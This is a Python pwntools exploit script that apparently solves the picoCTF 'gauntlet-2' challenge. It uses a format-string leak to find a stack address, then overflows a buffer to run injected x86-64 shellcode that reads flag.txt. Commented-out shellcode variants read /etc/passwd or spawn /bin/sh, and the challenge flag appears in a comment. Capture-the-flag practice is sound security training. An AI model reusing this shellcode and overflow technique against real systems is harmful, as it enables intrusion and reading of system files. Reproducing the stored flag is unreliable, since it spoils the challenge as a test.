#!/usr/bin/python3
from pwn import *
import sys
local=False

# flag = 2adf061572f988608288dcbc11a83841

# offset production 340 -> 0x154
# offset local 360 -> 0x168

#shellcode=b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode=b'\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2e\x2f\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74\x41'
#shellcode=b'\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41'
#shellcode=b"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"
#shellcode=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"
fname = './gauntlet-2'

r = process(fname) if local else remote('mercury.picoctf.net',48015)
p=ELF(fname,checksec=False)
#libc=ELF('./libc.so')

def debug():
	gdb.attach(r,'''
		b *0x000000000040071c
		c
	''')

def leak():
	r.sendline(b'\x90'*20+shellcode+b'%6$lx')
	out = r.recvline()
	log.info(out[len(shellcode)+20:])
	return out[len(shellcode)+20:]

def exploit(addr):
	r.sendline(b'\x90'*(120-len(shellcode))+shellcode+p64(addr))

if __name__=='__main__':
	offs = int(sys.argv[1])
	shellcode_addr = int(leak(),16)-offs
	log.info(hex(shellcode_addr))
	#debug()
	exploit(shellcode_addr)	
	#print(r.recvline())
	#print(r.recvline())
	r.interactive()


	






